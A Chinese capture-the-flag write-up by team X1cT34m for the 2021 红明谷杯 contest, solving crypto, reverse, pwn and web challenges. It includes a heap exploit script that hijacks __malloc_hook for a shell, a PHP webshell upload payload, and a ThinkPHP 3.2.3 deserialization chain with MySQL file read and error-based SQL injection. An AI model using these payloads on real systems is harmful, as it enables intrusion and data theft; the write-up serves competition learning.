---
title: 红明谷杯 Writeup by X1cT34m
date: 2021-04-03
image: https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210404094236.png
description: 红明谷杯就随便打了打，没想到混了了个线上16名，看着波能不能ban人捡漏了
categories: 
- ctf_writeup
tags:
- 代码审计
---

## Misc

### 签到

BP抓包爆破

## Crypto

### RSA attack

开三次方根就有了

```python
from gmpy2 import iroot
from Crypto.Util.number import *

p1=172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649936031
p2=172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649902034

n=28592245028568852124815768977111125874262599260058745599820769758676575163359612268623240652811172009403854869932602124987089815595007954065785558682294503755479266935877152343298248656222514238984548734114192436817346633473367019138600818158715715935132231386478333980631609437639665255977026081124468935510279104246449817606049991764744352123119281766258347177186790624246492739368005511017524914036614317783472537220720739454744527197507751921840839876863945184171493740832516867733853656800209669179467244407710022070593053034488226101034106881990117738617496520445046561073310892360430531295027470929927226907793
c=15839981826831548396886036749682663273035548220969819480071392201237477433920362840542848967952612687163860026284987497137578272157113399130705412843449686711908583139117413
e = 1+1+1
for k in range(1000):
    if iroot(c+k*n,3)[1]==True:
        m=iroot(c+k*n,3)[0]
        break

flag=long_to_bytes(m)
print(flag)
```

## Reverse

### go

调换顺序 ，base58没了

```python
import base58

        
text= b"2GVdudkYo2CBXoQii7gfpkjTc4gT"
plaintext = ""
table1 = b"12Nrst6CDquvG7BefghJKLMEFHPQZabRSTUVmyzno89ApwxWXYcdkij345"
table2 = b"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

for i in range(len(text)):
    for j in range(len(table1)):
        if(text[i]==table1[j]):
            plaintext += chr(table2[j])
            break
print(plaintext)
print(base58.b58decode(plaintext.encode()))




flag{We1CTFc0m_2345}
```

顺序手动调换 

## Pwn

### 双边协议1.0

```python
from pwn import*
import base64
#context.log_level = 'DEBUG'
def get_argv(recv_string,string):
	#gdb.attach(p,"b *(0x555555554000+0x1348)")
	p.sendafter(recv_string,base64.b64encode(p32(0x12345678)*2 + p64(0x30) + p64(8) + p64(0x8) + 'A'*8 + string))
def Create(size,content):
	get_argv('Pg==','1')
	get_argv('emUgPj4=',str(size))
	get_argv('bnQgPj4=',content)
def Free():
	get_argv('Pg==','2')
def Edit(content):
	get_argv('Pg==','3')
	get_argv('bnQgPj4=',content)
def View():
	get_argv('Pg==','4')
p = process('./main')
libc =ELF('./libc-2.23.so')
p = remote('8.140.179.11',13452)
Create(0x20,'FMYY')
get_argv('Pg==','1')
get_argv('emUgPj4=',str(0x1000))
get_argv('Pg==','3')
#gdb.attach(p,"b *(0x555555554000+0xD10)")
payload = '\x00'*0x28 + p64(0x3A1) + '\x00'*0x378 + p64(0x21) + '\x00'*0x18  + p64(0x791) + '\x00'*0x788 + p64(0x781)
p.sendafter('bnQgPj4=',base64.b64encode(p32(0x12345678)*2 + p64(0xF30) + p64(8) + p64(0xF08) + 'A'*8 + payload))
Create(0x20,'\x78')
View()
p.recvline()
data = base64.b64decode(p.recvline())
libc_base = u64(data[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x68 #+ 0x100000000
log.info('LIBC:\t' + hex(libc_base))
Create(0x10,'\x10')
View()
p.recvline()
data = base64.b64decode(p.recvline())
heap_base = u64(data[-6:].ljust(8,'\x00')) - 0xA10
log.info('HEAP:\t' + hex(heap_base))

get_argv('Pg==','3')
p.sendafter('bnQgPj4=',base64.b64encode(p32(0x12345678)*2 + p64(0) + p64(0x68) + p64(0x68) + 'A'*8 + 'FMYY' + '\n'))


Create(0x60,p64(libc_base + libc.sym['__malloc_hook'] - 0x23))
Create(0x60,'FMYY')
Create(0x60,'FMYY')
Create(0x60,'FMYY')
get_argv('Pg==','3')
p.sendafter('bnQgPj4=',base64.b64encode(p32(0x12345678)*2 + p64(0x50) + p64(0x8) + p64(0x28) + 'A'*8 + '\x00'*0x13 + p64(libc_base + 0xF1207) + '\n'))

p.interactive()
```

## Web

### write_shell

```php
?action=pwd
```

得到存储路径

```php
?action=upload&data=<?=`rev%09/*gggg*`?>
```

得到结果逆转一下就行

### easytp

扫目录得到`www.zip`

看到是`ThinkPHP 3.2.3`

`/home/index`有反序列化：

![image-20210402202821980](https://leonsec.gitee.io/images/image-20210402202821980.png)

与源码diff一下，看到改了`Library\Think\Db\Driver.class.php`

![asadas](https://leonsec.gitee.io/images/asadas.png)

猜测有mysql，记得tp3.2.3有反序列化打数据库类的链：https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA

尝试了一下，可以任意文件读

没读到有用的信息，猜测数据库密码123456

然后可以报错注入

poc:

```php
<?php
namespace Think\Db\Driver{
    use PDO;
    class Mysql{
        protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE => true    // 开启才能读取文件
        );
        protected $config = array(
            "debug"    => 1,
            "database" => "mysql",
            "hostname" => "127.0.0.1",
            "hostport" => "3306",
            "charset"  => "utf8",
            "username" => "root",
            "password" => "123456"
        );
    }
}

namespace Think\Image\Driver{
    use Think\Session\Driver\Memcache;
    class Imagick{
        private $img;

        public function __construct(){
            $this->img = new Memcache();
        }
    }
}

namespace Think\Session\Driver{
    use Think\Model;
    class Memcache{
        protected $handle;

        public function __construct(){
            $this->handle = new Model();
        }
    }
}

namespace Think{
    use Think\Db\Driver\Mysql;
    class Model{
        protected $options   = array();
        protected $pk;
        protected $data = array();
        protected $db = null;

        public function __construct(){
            $this->db = new Mysql();
            $this->options['where'] = '';
            $this->pk = 'id';
            $this->data[$this->pk] = array(
                "table" => "mysql.user where 1=updatexml(1,concat(0x7e,substr((select f14g from tp.f14g),32,64),0x7e),1)#",
                "where" => "1=1"
            );
        }
    }
}

namespace {
    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
}
```

poc中查库查表语句如下：

```php
updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),32,64),0x7e),1)

updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='tp'),1,32),0x7e),1)

updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='f14g'),1,32),0x7e),1)
```

![image-20210402202541147](https://leonsec.gitee.io/images/image-20210402202541147.png)

![image-20210402202206988](https://leonsec.gitee.io/images/image-20210402202206988.png)

![image-20210402202149998](https://leonsec.gitee.io/images/image-20210402202149998.png)


![image-20210402202043924](https://leonsec.gitee.io/images/image-20210402202043924.png)

![image-20210402202110500](https://leonsec.gitee.io/images/image-20210402202110500.png)

flag{07d47ce4-b5de-4671-9cdf-568fb9ec822f}